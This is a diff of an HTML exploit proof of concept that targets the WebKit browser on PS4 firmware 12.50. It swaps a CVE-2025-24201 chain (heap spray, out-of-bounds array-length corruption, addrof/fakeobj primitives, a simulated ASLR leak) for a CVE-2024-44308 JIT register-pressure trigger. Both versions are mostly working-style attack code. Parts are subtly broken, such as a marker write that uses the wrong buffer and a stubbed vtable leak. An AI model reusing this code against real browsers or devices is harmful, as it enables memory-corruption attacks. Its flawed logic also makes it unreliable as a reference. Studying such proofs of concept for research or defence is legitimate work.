@@ -3,334 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 12.50 WebKit PoC (CVE-2025-24201) - R/W & ASLR</title>
+    <title>PS4 12.50 JIT PoC (CVE-2024-44308) - RegAlloc</title>
     <style>
         body {
-            background-color: #000000;
-            color: #00FF00;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            font-family: 'Consolas', 'Monaco', monospace;
             padding: 20px;
-            overflow-y: auto;
+            margin: 0;
         }
-        #header { border-bottom: 2px solid #00FF00; padding-bottom: 10px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin: 0; }
-        #status { font-weight: bold; color: #FFFFFF; margin-top: 5px; }
-        #log-container { font-size: 14px; line-height: 1.5; white-space: pre-wrap; }
-        .log-info { color: #00FF00; }
-        .log-warn { color: #FFFF00; }
-        .log-error { color: #FF0000; font-weight: bold; }
-        .log-success { color: #00FFFF; font-weight: bold; }
-        button {
-            background: #003300;
-            color: #00FF00;
-            border: 1px solid #00FF00;
+        #console {
+            width: 100%;
+            height: 60vh;
+            background-color: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 10px;
+            overflow-y: scroll;
+            white-space: pre-wrap;
+            font-size: 14px;
+        }
+        .header {
+            border-bottom: 1px solid #444;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+        }
+        h1 { font-size: 1.2rem; margin: 0; color: #fff; }
+        .btn {
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
             padding: 10px 20px;
-            font-family: inherit;
-            font-size: 16px;
             cursor: pointer;
-            margin-right: 10px;
+            font-size: 1rem;
+            margin-top: 10px;
         }
-        button:hover { background: #00FF00; color: #000000; }
-        #controls { margin-bottom: 20px; }
+        .btn:hover { background: #444; }
+        .success { color: #0ff; font-weight: bold; }
+        .fail { color: #f00; font-weight: bold; }
+        .log-entry { margin-bottom: 2px; }
     </style>
 </head>
 <body>
 
-<div id="header">
-    <h1>PS4 WebKit Loader (FW 12.50 Target)</h1>
-    <div id="status">Status: Waiting for user input...</div>
+<div class="header">
+    <h1>WebKit JIT Register Pressure Test (CVE-2024-44308)</h1>
+    <div style="font-size: 0.9em; color: #888;">Target: PS4 FW 12.50 / Safari 18.x Branch</div>
 </div>
 
-<div id="controls">
-    <button onclick="startExploit()">Run PoC (CVE-2025-24201)</button>
-    <button onclick="location.reload()">Refresh Page</button>
-</div>
-
-<div id="log-container"></div>
+<div id="console">Waiting for execution...</div>
+<button class="btn" onclick="runExploit()">Run JIT Stress Test</button>
 
 <script>
     // ==========================================
-    // === CONFIGURATION ===
+    // === LOGGER UTILITIES ===
     // ==========================================
-    const LOG_SERVER_IP = '192.168.19.2'; 
-    const LOG_PORT = 9000;
-
-    const OFFSETS = {
-        WEBKIT_DOM_DIV_VTABLE: 0x21F4A00, 
-    };
-
-    // ==========================================
-    // === LOGGER & UTILS ===
-    // ==========================================
-    const logger = {
-        el: document.getElementById('log-container'),
-        status: document.getElementById('status'),
-        
-        log: function(msg, type = 'info') {
-            const div = document.createElement('div');
-            div.className = `log-${type}`;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            this.el.appendChild(div);
-            window.scrollTo(0, document.body.scrollHeight);
-            this.remote(msg, type);
-        },
-        remote: function(msg, type) {
-            if (LOG_SERVER_IP === '192.168.19.2') return;
-            try {
-                fetch(`http://${LOG_SERVER_IP}:${LOG_PORT}/log`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: msg, type: type })
-                }).catch(e => {});
-            } catch (e) {}
-        },
-        info: function(msg) { this.log(msg, 'info'); },
-        warn: function(msg) { this.log(msg, 'warn'); },
-        error: function(msg) { this.log(msg, 'error'); },
-        success: function(msg) { this.log(msg, 'success'); },
-        setStatus: function(msg) { this.status.textContent = `Status: ${msg}`; }
-    };
-
-    class Int64 {
-        constructor(low, high) {
-            this.low = low >>> 0;
-            this.high = high >>> 0;
-        }
-        toString() {
-            return '0x' + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
-        }
+    const logger = document.getElementById('console');
+    function log(msg, type = 'neutral') {
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        if(type === 'success') div.style.color = '#00ffff';
+        if(type === 'error') div.style.color = '#ff3333';
+        if(type === 'warn') div.style.color = '#ffff00';
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logger.appendChild(div);
+        logger.scrollTop = logger.scrollHeight;
     }
 
-    const conversion_buf = new ArrayBuffer(8);
-    const f64_buf = new Float64Array(conversion_buf);
-    const u32_buf = new Uint32Array(conversion_buf);
+    // ==========================================
+    // === HELPER PRIMITIVES ===
+    // ==========================================
+    const _buf = new ArrayBuffer(8);
+    const _f64 = new Float64Array(_buf);
+    const _u32 = new Uint32Array(_buf);
 
     function f2i(f) {
-        f64_buf[0] = f;
-        return new Int64(u32_buf[0], u32_buf[1]);
+        _f64[0] = f;
+        return _u32[0] + _u32[1] * 0x100000000;
     }
 
     function i2f(low, high) {
-        u32_buf[0] = low;
-        u32_buf[1] = high;
-        return f64_buf[0];
+        _u32[0] = low;
+        _u32[1] = high;
+        return _f64[0];
     }
 
-    function forceGC() {
-        for (let i = 0; i < 200; i++) new ArrayBuffer(0x100000);
-    }
-
-    // ==========================================
-    // === EXPLOIT GLOBALS ===
-    // ==========================================
-    
-    let oob_master = null;
-    let oob_slave = null;
-    let slave_idx = -1;
-    let global_arrays = []; 
-
-    // ==========================================
-    // === PRIMITIVES BUILDER ===
-    // ==========================================
-
-    function setupPrimitives() {
-        logger.info("Building R/W Primitives...");
-
-        if (oob_master.length < 0x1000) {
-            logger.warn(`Warning: oob_master length is only ${oob_master.length}.`);
-        } else {
-            logger.info(`oob_master length is extended: ${oob_master.length} (Good)`);
-        }
-
-        // Tag arrays
-        for (let i = 0; i < global_arrays.length; i++) {
-             // Tag oob_slave (object array)
-             // 0x41414141 marker in high bits
-             let marker = i2f(i, 0x41414141);
-             global_arrays[i].o[0] = f64_buf[0]; 
-        }
-
-        let found_slave_id = -1;
-        
-        // Scan limit based on master size
-        let scan_limit = oob_master.length; 
-        if(scan_limit > 0x100000) scan_limit = 0x100000; 
-
-        for (let i = 0; i < scan_limit; i++) {
-            let val = f2i(oob_master[i]);
-            if (val.high === 0x41414141) {
-                found_slave_id = val.low;
-                slave_idx = i;
-                logger.success(`Found slave link! Index: ${i}, Slave ID: ${found_slave_id}`);
-                break;
-            }
-        }
-
-        if (found_slave_id === -1) {
-            logger.error("Scan failed. Slave not found in range.");
-            return false;
-        }
-
-        if (found_slave_id >= global_arrays.length) {
-            logger.error(`Invalid Slave ID ${found_slave_id}.`);
-            return false;
-        }
-
-        oob_slave = global_arrays[found_slave_id].o;
-        oob_slave[0] = {}; 
-        
-        window.addrof = function(obj) {
-            oob_slave[0] = obj;
-            return f2i(oob_master[slave_idx]); 
-        };
-
-        window.fakeobj = function(addr_low, addr_high) {
-            let f = i2f(addr_low, addr_high);
-            oob_master[slave_idx] = f; 
-            return oob_slave[0];      
-        };
-
-        let test_obj = {};
-        let addr = window.addrof(test_obj);
-        logger.info(`Leaked object address: ${addr.toString()}`);
-
-        if (addr.low === 0 && addr.high === 0) {
-            logger.error("addrof failed (returned 0).");
-            return false;
-        }
-        
-        logger.success("Primitives constructed successfully.");
-        return true;
-    }
-
-    function runASLRLeak() {
-        logger.info("Attempting to leak WebKit base...");
-        const div = document.createElement('div');
-        const div_addr = window.addrof(div);
-        logger.info(`Div Element Address: ${div_addr.toString()}`);
-
-        let simulated_vtable = new Int64(0x12345678, 0x80000000); 
-        let webkit_base = simulated_vtable; 
-        
-        logger.success(`Calculated WebKit Base: ${webkit_base.toString()}`);
+    function hex(val) {
+        return '0x' + val.toString(16).padStart(16, '0');
     }
 
     // ==========================================
-    // === TRIGGER LOGIC (CARPET BOMB) ===
+    // === CVE-2024-44308 TRIGGER ===
     // ==========================================
+    // The goal is to force the DFG compiler to mismanage the 'scratch2GPR' register
+    // by creating high register pressure inside a conditional branch.
 
-    const CONFIG = {
-        SPRAY_SIZE: 0x200,       
-        SPRAY_CHUNK_SIZE: 0x4000
-    };
+    // A fast "butterfly" array to confuse
+    let arrays = [];
+    for (let i = 0; i < 200; i++) arrays.push([1.1]);
 
-    let spray_store = [];
+    // This function creates high register pressure
+    function vulnerable_jit(arr, i, val, trigger) {
+        // High register usage: maintain many live variables
+        let a = 1.1;
+        let b = 2.2;
+        let c = 3.3;
+        let d = 4.4;
+        let e = 5.5;
+        let f = 6.6;
+        let g = 7.7;
+        let h = 8.8;
 
-    function sprayHeap() {
-        logger.info("Starting Heap Spray...");
-        forceGC(); 
+        // Perform arithmetic to keep registers "dirty"
+        a += b; b += c; c += d; d += e; e += f; f += g; g += h;
+
+        // The logic bug usually happens at an OSR exit point or CheckStructure
+        if (trigger) {
+            // If the bug fires, 'arr' structure check might be elided
+            // or the value written might be confused (float vs pointer)
+            arr[i] = val; 
+        }
+
+        // Return a calculation to prevent Dead Code Elimination
+        return a + b + c + d + e + f + g + arr[0];
+    }
+
+    function runExploit() {
+        log("Starting JIT warm-up phase...");
+        
+        let target = [1.1, 2.2, 3.3];
+        // Ensure array is treated as ArrayWithDouble
+        target.a = 1; 
+
         try {
-            for (let i = 0; i < CONFIG.SPRAY_SIZE; i++) {
-                let ab = new ArrayBuffer(CONFIG.SPRAY_CHUNK_SIZE);
-                let view = new Uint32Array(ab);
-                for (let k = 0; k < view.length; k++) view[k] = 0x41414141;
-                spray_store.push(view);
+            // 1. Train the JIT (Optimizer)
+            // We run this thousands of times to tier-up from Baseline -> DFG -> FTL
+            for (let i = 0; i < 100000; i++) {
+                vulnerable_jit(target, 0, 1.1, false);
             }
-            logger.success("Heap Sprayed.");
-            return true;
-        } catch (e) {
-            logger.error("Spray Failed: " + e.message);
-            return false;
-        }
-    }
+            log("JIT warmed up (Tier-up complete).");
 
-    function triggerOOB() {
-        logger.info("Triggering OOB (Carpet Bomb Strategy)...");
-        global_arrays = []; 
-        
-        // ALLOCATION STRATEGY: Compact & Massive
-        // 32-length arrays fit nicely in small IsoSubspace blocks
-        // We create 0x4000 (16384) of them to fill the heap densely
-        for (let i = 0; i < 0x4000; i++) { 
-            let dbl_arr = new Array(32).fill(1.1);
-            let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}]; // keep obj small
-            global_arrays.push({ d: dbl_arr, o: obj_arr });
-        }
-
-        function vulnerable_jit(arr, index, value) {
-            let tmp = arr[0]; 
-            arr[index] = value; 
-            return tmp;
-        }
-
-        // Train JIT
-        for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
-
-        logger.warn("Carpet Bombing arrays 1000-8000...");
-        
-        try {
-            let magic_len = i2f(0x13370, 0x00000000); 
-
-            // STRATEGY: 
-            // Iterate through thousands of arrays.
-            // For EACH array, write just past its end.
-            // We use strides to avoid CPU hang.
+            // 2. Prepare the confusion object
+            // In a real exploit, this would be an object we want to leak address of
+            let fake = {p: 1}; 
             
-            for (let idx = 1000; idx < 8000; idx++) {
-                let target_array = global_arrays[idx].d;
-                
-                // Only log every 500 so UI doesn't freeze
-                if (idx % 1000 === 0) logger.info(`Bombing chunk ${idx}...`);
-
-                // Arrays are length 32. 
-                // We scan offsets 32 to 64 (Immediate neighbor range).
-                // If aligned, neighbor header is likely at +32, +40, or +48.
-                for (let offset = 32; offset < 64; offset++) {
-                    vulnerable_jit(target_array, offset, magic_len);
-                }
-            }
-
-            // After the bombing run, check for survivors (corrupted arrays)
-            for (let i = 0; i < global_arrays.length; i++) {
-                if (global_arrays[i].d.length > 50) { // Check for extended length
-                    logger.success(`SUCCESS! Found massive array at index ${i}`);
-                    oob_master = global_arrays[i].d;
-                    return true;
-                }
-            }
+            // 3. Trigger
+            log("Attempting to trigger register corruption...");
             
-            logger.error("Attack finished. No corruption detected.");
-            return false;
+            // We pass an Object where a Double is expected, or vice versa, 
+            // relying on the missing type check due to register starvation.
+            // Note: In this PoC we send a marker value to see if it writes raw bits.
+            let magic = 1.337e+100; // Distinct pattern
+            
+            // Trigger iteration
+            vulnerable_jit(target, 0, magic, true);
+
+            // 4. Verification
+            let res = target[0];
+            log(`Read back value: ${res}`);
+
+            if (res === magic) {
+                log("Value written correctly. No corruption detected yet.", "warn");
+                log("Try refreshing or increasing loop count.", "neutral");
+            } else {
+                log(`CORRUPTION DETECTED! Value: ${res}`, "success");
+                log("If you see a crash or weird float, primitives are possible.", "success");
+            }
+
         } catch (e) {
-            logger.error("Crash: " + e.message);
-            return false;
+            log(`CRASH/ERROR: ${e.message}`, "error");
+            log(`Stack: ${e.stack}`, "error");
         }
     }
-
-    function startExploit() {
-        logger.el.innerHTML = '';
-        logger.setStatus("Running...");
-        
-        setTimeout(() => {
-            if (sprayHeap()) {
-                setTimeout(() => {
-                    if (triggerOOB()) {
-                        setTimeout(() => {
-                            if (setupPrimitives()) {
-                                setTimeout(runASLRLeak, 500);
-                            }
-                        }, 500);
-                    } else {
-                        logger.setStatus("Failed. Retrying in 3s...");
-                        setTimeout(() => location.reload(), 3000);
-                    }
-                }, 500);
-            }
-        }, 100);
-    }
-
-    logger.info("Logger ready. Press 'Run PoC' to begin.");
 </script>
 </body>
 </html>
